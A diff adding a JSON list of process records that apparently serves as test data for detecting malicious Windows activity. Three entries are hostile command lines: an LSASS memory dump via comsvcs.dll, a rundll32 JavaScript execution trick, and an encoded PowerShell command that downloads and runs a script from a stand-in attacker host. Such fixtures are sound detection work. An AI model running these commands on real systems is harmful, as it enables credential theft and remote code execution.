@@ -1,0 +1,27 @@
+[
+  {
+    "PID": 7201,
+    "Process": "rundll32.exe",
+    "Args": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Users\\Public\\lsass.dmp full"
+  },
+  {
+    "PID": 7202,
+    "Process": "rundll32.exe",
+    "Args": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c whoami\")"
+  },
+  {
+    "PID": 7203,
+    "Process": "powershell.exe",
+    "Args": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AYQB0AHQAYQBjAGsAZQByAC4AZQB4AGEAbQBwAGwAZQAvAG0AaQBtAGkALgBwAHMAMQAiACkA"
+  },
+  {
+    "PID": 3100,
+    "Process": "lsass.exe",
+    "Args": "C:\\Windows\\System32\\lsass.exe"
+  },
+  {
+    "PID": 3101,
+    "Process": "services.exe",
+    "Args": "C:\\Windows\\System32\\services.exe"
+  }
+]
